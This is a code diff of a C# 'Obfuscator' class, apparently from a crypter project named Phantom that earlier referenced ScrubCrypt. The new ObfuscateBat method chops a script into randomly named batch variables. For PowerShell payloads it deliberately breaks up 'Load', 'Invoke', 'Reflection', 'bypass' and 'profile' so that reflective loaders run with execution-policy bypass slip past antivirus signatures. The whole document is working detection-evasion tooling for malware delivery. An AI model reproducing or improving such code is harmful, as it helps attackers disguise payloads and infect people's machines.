@@ -1,5 +1,4 @@
-﻿using ScrubCrypt;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -9,102 +8,62 @@ namespace Phantom
 {
     public class Obfuscator
     {
-
-
-        public static string InsertChar(string input, params string[] d)
+        public static string ObfuscateBat(string code, bool ispowershellscript = false)
         {
-            List<string> list = new List<string>();
-            string text = string.Empty;
-            foreach (char c in input)
+            StringBuilder obfuscation2 = new StringBuilder();
+
+            string Load_kw = string.Empty;
+            string Invoke_kw = string.Empty;
+            string Reflection_kw = string.Empty;
+            string bypass_kw = string.Empty;
+            string profile_kw = string.Empty;
+            if (ispowershellscript)
             {
-                if (text.Length >= Randomiser.RNG.Next(1, 4))
-                {
-                    list.Add(text);
-                    text = string.Empty;
-                }
-                text += c.ToString();
+                Load_kw = RandomString(4);
+                Invoke_kw = RandomString(4);
+                Reflection_kw = RandomString(4);
+                bypass_kw = RandomString(4);
+                profile_kw = RandomString(4);
+                obfuscation2.Append(@"set """ + Load_kw + @"=Lo""" + Environment.NewLine);
+                obfuscation2.Append(@"set """ + Invoke_kw + @"=nvo""" + Environment.NewLine);
+                obfuscation2.Append(@"set """ + Reflection_kw + @"=lect""" + Environment.NewLine);
+                obfuscation2.Append(@"set """ + bypass_kw + @"=byp""" + Environment.NewLine);
+                obfuscation2.Append(@"set """ + profile_kw + @"=prof""" + Environment.NewLine);
             }
-            list.Add(text);
-            StringBuilder stringBuilder = new StringBuilder();
-            foreach (string str in list)
+
+            List<string> random1list = new List<string>();
+
+            int varsize = 20;
+            int blocksize = 20;
+            for (int i = 0; i < code.Length; i += blocksize)
             {
-                if (d.Length > 1)
+                string block = code.Substring(i, Math.Min(blocksize, code.Length - i));
+                string random1 = RandomString(varsize);
+                random1list.Add(random1);
+                if (ispowershellscript)
                 {
-                    stringBuilder.Append(str + d[Randomiser.RNG.Next(d.Length)]);
+                    block = block.Replace("Lo", "%" + Load_kw + "%");
+                    block = block.Replace("nvo", "%" + Invoke_kw + "%");
+                    block = block.Replace("lect", "%" + Reflection_kw + "%");
+                    block = block.Replace("byp", "%" + bypass_kw + "%");
+                    block = block.Replace("prof", "%" + profile_kw + "%");
                 }
-                else
-                {
-                    stringBuilder.Append(str + d[0]);
-                }
+                obfuscation2.Append(@"set """ + random1 + @"=" + block + @"""" + Environment.NewLine);
             }
-            return stringBuilder.ToString();
+
+            foreach (string random2 in random1list.ToArray())
+            {
+                obfuscation2.Append(@"%" + random2 + @"%");
+            }
+
+            return obfuscation2.ToString().TrimEnd(Environment.NewLine.ToCharArray());
         }
 
-        public static (string, string) GenCodeBat(string input, Random rng, string SetVarName, int level = 5)
+        private static Random random = new Random();
+
+        private static string RandomString(int length)
         {
-            string ret = string.Empty;
-            string[] lines = input.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
-
-            int amount = 5;
-            if (level > 1) amount -= level;
-            amount *= 2;
-
-            List<string> setlines = new List<string>();
-            List<string[]> linevars = new List<string[]>();
-            foreach (string line in lines)
-            {
-                List<string> splitted = new List<string>();
-                string sc = string.Empty;
-                bool invar = false;
-                foreach (char c in line)
-                {
-                    if (c == '%')
-                    {
-                        invar = !invar;
-                        sc += c;
-                        continue;
-                    }
-                    if ((c == ' ' || c == '\'' || c == '.') && invar)
-                    {
-                        invar = false;
-                        sc += c;
-                        continue;
-                    }
-                    if (!invar && sc.Length >= amount)
-                    {
-                        splitted.Add(sc);
-                        invar = false;
-                        sc = string.Empty;
-                    }
-                    sc += c;
-                }
-                splitted.Add(sc);
-
-                List<string> vars = new List<string>();
-                foreach (string s in splitted)
-                {
-                    string name = RandomString(10, rng);
-                    setlines.Add($"!{SetVarName}! \"{name}={s}\"");
-                    vars.Add(name);
-                }
-                linevars.Add(vars.ToArray());
-            }
-
-            setlines = new List<string>(setlines.OrderBy(x => rng.Next()));
-            for (int i = 0; i < setlines.Count; i++)
-            {
-                ret += setlines[i];
-                int r = rng.Next(0, 2);
-                ret += Environment.NewLine;
-            }
-
-            string varcalls = string.Empty;
-            foreach (string[] line in linevars)
-            {
-                foreach (string s in line) varcalls += $"%{s}%";
-                varcalls += Environment.NewLine;
-            }
-            return (ret.TrimEnd('\r', '\n'), varcalls.TrimEnd('\r', '\n'));
+            return Utils.RandomString(length, random);
         }
     }
 }
